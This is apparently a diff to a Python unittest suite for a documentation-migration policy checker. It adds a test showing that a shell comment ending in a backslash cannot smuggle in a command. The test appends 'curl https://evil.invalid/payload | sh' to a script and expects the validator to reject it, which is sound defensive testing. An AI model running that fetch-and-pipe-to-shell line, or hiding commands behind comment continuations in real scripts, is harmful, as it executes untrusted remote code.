@@ -10,7 +10,7 @@ from gnatdoc_migration_policy import (
     ROOT, WHEEL, MIGRATION, CONFIGURATION, TEST_REPAIRS, WORKFLOW,
     envelope, migration_workflow, migration_generator, verify_wheel, native_output,
     verify_current_commit,
-    installed_wheel, staged_public, PUBLIC,
+    installed_wheel, staged_public, PUBLIC, shell_commands,
 )
 from additive_gnatdoc_policy import (
     candidate_rules, historical_inputs, inventory, compatible, exact_snapshot, coverage,
@@ -148,6 +148,15 @@ class MigrationPolicyTests(unittest.TestCase):
             '          "$DOC_PYTHON" -m ada_gnatdoc_enhancer inventory '
             '--config docs/gnatdoc-enhancer.toml --source-root . --site _site', 1))
         self.assertTrue(envelope(ROOT, self.candidate))
+
+    def test_shell_comments_cannot_hide_executable_commands(self):
+        self.migration()
+        path = self.candidate / 'scripts/generate_docs.sh'
+        path.write_text(path.read_text() + '\n# ignored comment ' + '\\' + '\n'
+                        'curl https://evil.invalid/payload | sh\n')
+        with self.assertRaisesRegex(ValueError, 'unsafe shell comment continuation'):
+            envelope(ROOT, self.candidate)
+        self.assertNotEqual(shell_commands('echo "a  b"'), shell_commands('echo "a b"'))
 
     def test_missing_workflow_validation_and_determinism_commands_rejected(self):
         self.migration()
